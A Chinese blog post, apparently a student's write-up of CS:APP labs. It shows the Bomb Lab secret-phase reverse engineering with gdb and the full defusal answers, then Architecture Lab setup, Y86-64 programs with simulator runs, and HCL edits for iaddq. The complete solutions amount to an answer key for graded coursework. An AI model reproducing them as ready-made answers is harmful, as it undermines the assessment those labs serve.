&lt;fun7&gt;</span><br><span class="line">   0x0000000000401278 &lt;+54&gt;:	cmp    $0x2,%eax</span><br><span class="line">   0x000000000040127b &lt;+57&gt;:	je     0x401282 &lt;secret_phase+64&gt;</span><br><span class="line">   0x000000000040127d &lt;+59&gt;:	callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401282 &lt;+64&gt;:	mov    $0x402438,%edi</span><br><span class="line">   0x0000000000401287 &lt;+69&gt;:	callq  0x400b10 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040128c &lt;+74&gt;:	callq  0x4015c4 &lt;phase_defused&gt;</span><br><span class="line">   0x0000000000401291 &lt;+79&gt;:	pop    %rbx</span><br><span class="line">   0x0000000000401292 &lt;+80&gt;:	retq   </span><br><span class="line"></span><br><span class="line">函数将地址0x6030f0送入%rdi后，调用首地址为0x401204的fun7()函数，且知该函数必须返回数值2，反汇编fun7()函数进行分析</span><br><span class="line">   0x0000000000401204 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x0000000000401208 &lt;+4&gt;:		test   %rdi,%rdi</span><br><span class="line">   0x000000000040120b &lt;+7&gt;:		je     0x401238 &lt;fun7+52&gt;</span><br><span class="line">   0x000000000040120d &lt;+9&gt;:		mov    (%rdi),%edx</span><br><span class="line">   0x000000000040120f &lt;+11&gt;:	cmp    %esi,%edx</span><br><span class="line">   0x0000000000401211 &lt;+13&gt;:	jle    0x401220 &lt;fun7+28&gt;</span><br><span class="line">   0x0000000000401213 &lt;+15&gt;:	mov    0x8(%rdi),%rdi</span><br><span class="line">   0x0000000000401217 &lt;+19&gt;:	callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   0x000000000040121c &lt;+24&gt;:	add    %eax,%eax</span><br><span class="line">   0x000000000040121e &lt;+26&gt;:	jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401220 &lt;+28&gt;:	mov    $0x0,%eax</span><br><span class="line">   0x0000000000401225 &lt;+33&gt;:	cmp    %esi,%edx</span><br><span class="line">   0x0000000000401227 &lt;+35&gt;:	je     0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401229 &lt;+37&gt;:	mov    0x10(%rdi),%rdi</span><br><span class="line">   0x000000000040122d &lt;+41&gt;:	callq  0x401204 &lt;fun7&gt;</span><br><span class="line">   0x0000000000401232 &lt;+46&gt;:	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">   0x0000000000401236 &lt;+50&gt;:	jmp    0x40123d &lt;fun7+57&gt;</span><br><span class="line">   0x0000000000401238 &lt;+52&gt;:	mov    $0xffffffff,%eax</span><br><span class="line">   0x000000000040123d &lt;+57&gt;:	add    $0x8,%rsp</span><br><span class="line">   0x0000000000401241 &lt;+61&gt;:	retq   </span><br><span class="line"></span><br><span class="line">尝试将该函数反编译为c代码风格</span><br><span class="line">fun7(x, y)</span><br><span class="line">x in %rdi, y in %rsi, p for %rdx</span><br><span class="line">	if (x &#x3D;&#x3D; 0) return -1;</span><br><span class="line">	p &#x3D; *x;</span><br><span class="line">	if (p &lt;&#x3D; y) &#123;</span><br><span class="line">		if (p &#x3D;&#x3D; y) return 0;</span><br><span class="line">		return 2 * fun7(x, y) + 1;</span><br><span class="line">	&#125;</span><br><span class="line">	x &#x3D; *(x + 8);</span><br><span class="line">	return 2 * fun7(x, y);</span><br><span class="line">	</span><br><span class="line">初次调用fun7()函数时，x值为0x6030f0, y值为我们输入的一个字符串转换所得数值，结合0x6030f0内存地址的值等，可以推出一个答案y值为22(0x16).在我通过此方法推出一个答案值后，参考他人题解，知0x6030f0为一二叉树根节点地址，该数每个结点含一个值和两个指向左右儿子的指针</span><br><span class="line">(gdb) x &#x2F;80a 0x6030f0</span><br><span class="line">0x6030f0 &lt;n1&gt;:	0x24	0x603110 &lt;n21&gt;</span><br><span class="line">0x603100 &lt;n1+16&gt;:	0x603130 &lt;n22&gt;	0x0</span><br><span class="line">0x603110 &lt;n21&gt;:	0x8	0x603190 &lt;n31&gt;</span><br><span class="line">0x603120 &lt;n21+16&gt;:	0x603150 &lt;n32&gt;	0x0</span><br><span class="line">0x603130 &lt;n22&gt;:	0x32	0x603170 &lt;n33&gt;</span><br><span class="line">0x603140 &lt;n22+16&gt;:	0x6031b0 &lt;n34&gt;	0x0</span><br><span class="line">0x603150 &lt;n32&gt;:	0x16	0x603270 &lt;n43&gt;</span><br><span class="line">0x603160 &lt;n32+16&gt;:	0x603230 &lt;n44&gt;	0x0</span><br><span class="line">0x603170 &lt;n33&gt;:	0x2d	0x6031d0 &lt;n45&gt;</span><br><span class="line">0x603180 &lt;n33+16&gt;:	0x603290 &lt;n46&gt;	0x0</span><br><span class="line">0x603190 &lt;n31&gt;:	0x6	0x6031f0 &lt;n41&gt;</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:	0x603250 &lt;n42&gt;	0x0</span><br><span class="line">0x6031b0 &lt;n34&gt;:	0x6b	0x603210 &lt;n47&gt;</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:	0x6032b0 &lt;n48&gt;	0x0</span><br><span class="line"></span><br><span class="line">由以上信息可构建树为</span><br></pre></td></tr></table></figure>

<img src="/2021/04/05/CSAPP-Labs/bomblab_tree.png" class>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">故可的答案为22(0x16),</span> <span class="number">20</span><span class="string">(0x14).</span></span><br><span class="line"></span><br><span class="line"><span class="string">至此，全部谜题破解</span></span><br><span class="line"><span class="string">fez@LAPTOP-MB5DL415:/mnt/d/repositories/CSAPP/Labs/BombLab$</span> <span class="string">cat</span> <span class="string">phases.txt</span> </span><br><span class="line"><span class="string">Border</span> <span class="string">relations</span> <span class="string">with</span> <span class="string">Canada</span> <span class="string">have</span> <span class="string">never</span> <span class="string">been</span> <span class="string">better.</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">8</span> <span class="number">16</span> <span class="number">32</span></span><br><span class="line"><span class="number">0</span> <span class="number">207</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="string">DrEvil</span></span><br><span class="line"><span class="string">IONEFG</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">6</span> <span class="number">5</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="string">fez@LAPTOP-MB5DL415:/mnt/d/repositories/CSAPP/Labs/BombLab$</span> <span class="string">./bomb</span> <span class="string">phases.txt</span> </span><br><span class="line"><span class="string">Welcome</span> <span class="string">to</span> <span class="string">my</span> <span class="string">fiendish</span> <span class="string">little</span> <span class="string">bomb.</span> <span class="string">You</span> <span class="string">have</span> <span class="number">6</span> <span class="string">phases</span> <span class="string">with</span></span><br><span class="line"><span class="string">which</span> <span class="string">to</span> <span class="string">blow</span> <span class="string">yourself</span> <span class="string">up.</span> <span class="string">Have</span> <span class="string">a</span> <span class="string">nice</span> <span class="string">day!</span></span><br><span class="line"><span class="string">Phase</span> <span class="number">1</span> <span class="string">defused.</span> <span class="string">How</span> <span class="string">about</span> <span class="string">the</span> <span class="string">next</span> <span class="string">one?</span></span><br><span class="line"><span class="string">That&#x27;s</span> <span class="string">number</span> <span class="number">2</span><span class="string">.</span>  <span class="string">Keep</span> <span class="string">going!</span></span><br><span class="line"><span class="string">Halfway</span> <span class="string">there!</span></span><br><span class="line"><span class="string">So</span> <span class="string">you</span> <span class="string">got</span> <span class="string">that</span> <span class="string">one.</span>  <span class="string">Try</span> <span class="string">this</span> <span class="string">one.</span></span><br><span class="line"><span class="string">Good</span> <span class="string">work!</span>  <span class="string">On</span> <span class="string">to</span> <span class="string">the</span> <span class="string">next...</span></span><br><span class="line"><span class="string">Curses,</span> <span class="string">you&#x27;ve</span> <span class="string">found</span> <span class="string">the</span> <span class="string">secret</span> <span class="string">phase!</span></span><br><span class="line"><span class="string">But</span> <span class="string">finding</span> <span class="string">it</span> <span class="string">and</span> <span class="string">solving</span> <span class="string">it</span> <span class="string">are</span> <span class="string">quite</span> <span class="string">different...</span></span><br><span class="line"><span class="string">Wow!</span> <span class="string">You&#x27;ve</span> <span class="string">defused</span> <span class="string">the</span> <span class="string">secret</span> <span class="string">stage!</span></span><br><span class="line"><span class="string">Congratulations!</span> <span class="string">You&#x27;ve</span> <span class="string">defused</span> <span class="string">the</span> <span class="string">bomb!</span></span><br><span class="line">																<span class="number">2021</span><span class="string">/7/27</span></span><br><span class="line">																<span class="number">21</span><span class="string">:16</span></span><br></pre></td></tr></table></figure>

<h1 id="ArchitectureLab"><a href="#ArchitectureLab" class="headerlink" title="ArchitectureLab"></a>ArchitectureLab</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>这个实验无疑是目前已做三个实验里花费我最多精力的，很可能也是所有实验里最花费精力的一个。如某人所言，本实验实验环境的搭建甚至比实验内容本身还要困难。搭建环境的过程不知掉了多少头发，可谓是十分痛苦了，令我一度想要放弃本实验。现在磕磕绊绊把实验做完，回顾全过程，记录下实验中遇到的一些难点，即是反思回味，也希望能帮助同我当初一样面对这般那般的问题而一筹莫展的朋友</p>
<p>我的实验环境为WSL版的Ubuntu，由于没有安装相关库，模拟器不支持GUI界面，因此在解压sim包后，将sim目录下的<code>Makefile</code>文件中涉及GUI的三行注释掉</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GUIMODE=-DHAS_GUI</span></span><br><span class="line"><span class="comment">#TKLIBS=-L/usr/lib -ltk -ltcl</span></span><br><span class="line"><span class="comment">#TKINC=-isystem /usr/include</span></span><br></pre></td></tr></table></figure>

<p>注释GUI相关东西是我从别人博客学到的，在整个实验过程中我也没有使用过GUI。我自己也尝试过安装tk与tcl，但是如果安装版本是8.6及以上，仍不能正常使用，<strong>若想要在本实验中使用GUI，tk与tcl必须安装为8.5版本及以下</strong>，接着尝试</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; <span class="built_in">make</span> clean</span><br><span class="line">unix&gt; <span class="built_in">make</span></span><br></pre></td></tr></table></figure>

<p>如果报错信息包含关键词<code>flex</code>和<code>bison</code>，可能是没有安装相关依赖软件，尝试安装</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; sudo apt-<span class="builtin-name">get</span> install flex</span><br><span class="line">unix&gt; sudo apt-<span class="builtin-name">get</span> install bison</span><br></pre></td></tr></table></figure>

<p>当在sim目录及其子目录中任意一个进行</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; <span class="built_in">make</span></span><br></pre></td></tr></table></figure>

<p>时显示某.c文件报以下错误</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build fails <span class="keyword">with</span> tcl <span class="number">8.6</span>: <span class="keyword">error</span>: tcl_interp has <span class="keyword">no</span> <span class="keyword">member</span> named <span class="keyword">result</span></span><br></pre></td></tr></table></figure>

<p>请参考<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66291922/tk-h-looks-for-tcl-h-in-usr-include-but-tcl-h-is-in-usr-include-tcl-i-dont-h">这篇文章</a>查看解决方案</p>
<h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>这一部分内容较为简单，正如lab介绍文档中所言，part A部分是为后续实验准备的热身运动</p>
<h3 id="sum-ys"><a href="#sum-ys" class="headerlink" title="sum.ys"></a>sum.ys</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">list:</span><br><span class="line">	ele1:</span><br><span class="line">		.quad 0x00a</span><br><span class="line">		.quad ele2</span><br><span class="line">	ele2:</span><br><span class="line">		.quad 0x0b0</span><br><span class="line">		.quad ele3</span><br><span class="line">	ele3:</span><br><span class="line">		.quad 0xc00</span><br><span class="line">		.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq list, %rdi</span><br><span class="line">	call sum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line"># long sum_list(list_ptr ls)</span><br><span class="line"># ls in %rdi</span><br><span class="line">sum_list:</span><br><span class="line">	irmovq $8, %r8</span><br><span class="line">	xorq %rax, %rax</span><br><span class="line">test:</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">	je done</span><br><span class="line">	mrmovq (%rdi), %r9</span><br><span class="line">	addq %r9, %rax</span><br><span class="line">	addq %r8, %rdi</span><br><span class="line">	mrmovq (%rdi), %rdi</span><br><span class="line">	jmp test</span><br><span class="line">done:</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ArchitectureLab/sim/misc&gt; make sum.yo</span><br><span class="line">./yas sum.ys</span><br><span class="line">ArchitectureLab/sim/misc&gt; ./yis sum.yo</span><br><span class="line">Stopped <span class="keyword">in</span> <span class="number">32</span> steps at PC = <span class="number">0x13</span>.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=<span class="number">1</span> S=<span class="number">0</span> O=<span class="number">0</span></span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000cba</span></span><br><span class="line">%rsp:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000200</span></span><br><span class="line">%r8:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000008</span></span><br><span class="line">%r9:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000c00</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line"><span class="number">0x01f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000005b</span></span><br><span class="line"><span class="number">0x01f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000013</span></span><br></pre></td></tr></table></figure>

<h3 id="rsum-ys"><a href="#rsum-ys" class="headerlink" title="rsum.ys"></a>rsum.ys</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">	.align 8</span><br><span class="line">list:</span><br><span class="line">	ele1:</span><br><span class="line">		.quad 0x00a</span><br><span class="line">		.quad ele2</span><br><span class="line">	ele2:</span><br><span class="line">		.quad 0x0b0</span><br><span class="line">		.quad ele3</span><br><span class="line">	ele3:</span><br><span class="line">		.quad 0xc00</span><br><span class="line">		.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq list, %rdi</span><br><span class="line">	call rsum_list</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line"># long rsum_list(list_ptr ls)</span><br><span class="line"># ls in %rdi</span><br><span class="line">rsum_list:</span><br><span class="line">	irmovq $8, %r8</span><br><span class="line">	xorq %rax, %rax</span><br><span class="line">	andq %rdi, %rdi</span><br><span class="line">	je null_pointer</span><br><span class="line">	mrmovq (%rdi), %rbx</span><br><span class="line">	pushq %rbx</span><br><span class="line">	addq %r8, %rdi</span><br><span class="line">	mrmovq (%rdi), %rdi</span><br><span class="line">	call rsum_list</span><br><span class="line">	popq %rbx</span><br><span class="line">	addq %rbx, %rax</span><br><span class="line">null_pointer:</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArchitectureLab/sim/misc&gt; make rsum.yo</span><br><span class="line">./yas rsum.ys</span><br><span class="line">ArchitectureLab/sim/misc&gt; ./yis rsum.yo</span><br><span class="line">Stopped <span class="keyword">in</span> <span class="number">47</span> steps at PC = <span class="number">0x13</span>.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=<span class="number">0</span> S=<span class="number">0</span> O=<span class="number">0</span></span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000cba</span></span><br><span class="line">%rbx:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">%rsp:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000200</span></span><br><span class="line">%r8:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000008</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line"><span class="number">0x01c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000094</span></span><br><span class="line"><span class="number">0x01c8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000c00</span></span><br><span class="line"><span class="number">0x01d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000094</span></span><br><span class="line"><span class="number">0x01d8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b0</span></span><br><span class="line"><span class="number">0x01e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000094</span></span><br><span class="line"><span class="number">0x01e8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x01f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000005b</span></span><br><span class="line"><span class="number">0x01f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000013</span></span><br></pre></td></tr></table></figure>

<h3 id="copy-ys"><a href="#copy-ys" class="headerlink" title="copy.ys"></a>copy.ys</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># Execution begins at address 0</span><br><span class="line">	.pos 0</span><br><span class="line">	irmovq stack, %rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line"></span><br><span class="line">	.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"></span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	irmovq src, %rdi</span><br><span class="line">	irmovq dest, %rsi</span><br><span class="line">	irmovq $3, %rdx</span><br><span class="line">	call copy_block</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line"># long copy_block(long* src, long* dest, long len)</span><br><span class="line"># src in %rdi, dest in %rsi, len in %rdx</span><br><span class="line">copy_block:</span><br><span class="line">	irmovq $1, %r10</span><br><span class="line">	irmovq $8, %r8</span><br><span class="line">	xorq %rax, %rax</span><br><span class="line">loop:</span><br><span class="line">	andq %rdx, %rdx</span><br><span class="line">	je done</span><br><span class="line">	mrmovq (%rdi), %r9</span><br><span class="line">	addq %r8, %rdi</span><br><span class="line">	rmmovq %r9, (%rsi)</span><br><span class="line">	addq %r8, %rsi</span><br><span class="line">	xorq %r9, %rax</span><br><span class="line">	subq %r10, %rdx</span><br><span class="line">	jmp loop</span><br><span class="line">done:</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ArchitectureLab/sim/misc&gt; make copy.yo</span><br><span class="line">./yas copy.ys</span><br><span class="line">ArchitectureLab/sim/misc&gt; ./yis copy.yo</span><br><span class="line">Stopped <span class="keyword">in</span> <span class="number">41</span> steps at PC = <span class="number">0x13</span>.  Status <span class="string">&#x27;HLT&#x27;</span>, CC Z=<span class="number">1</span> S=<span class="number">0</span> O=<span class="number">0</span></span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000cba</span></span><br><span class="line">%rsp:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000200</span></span><br><span class="line">%rsi:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000048</span></span><br><span class="line">%rdi:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000030</span></span><br><span class="line">%r8:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000008</span></span><br><span class="line">%r9:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000c00</span></span><br><span class="line">%r10:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line"><span class="number">0x0030</span>:	<span class="number">0x0000000000000111</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x0038</span>:	<span class="number">0x0000000000000222</span>	<span class="number">0x00000000000000b0</span></span><br><span class="line"><span class="number">0x0040</span>:	<span class="number">0x0000000000000333</span>	<span class="number">0x0000000000000c00</span></span><br><span class="line"><span class="number">0x01f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000000006f</span></span><br><span class="line"><span class="number">0x01f8</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000013</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p>实验的第二部分也不困难，只需实现一个<code>iaddq</code>立即数加功能即可，所需修改部分如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">bool instr_valid &#x3D; icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?</span><br><span class="line">bool need_regids &#x3D;</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line">bool need_valC &#x3D;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line">## What register should be used as the B source?</span><br><span class="line">word srcB &#x3D; [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#39;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination?</span><br><span class="line">word dstE &#x3D; [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#39;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input A to ALU</span><br><span class="line">word aluA &#x3D; [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ 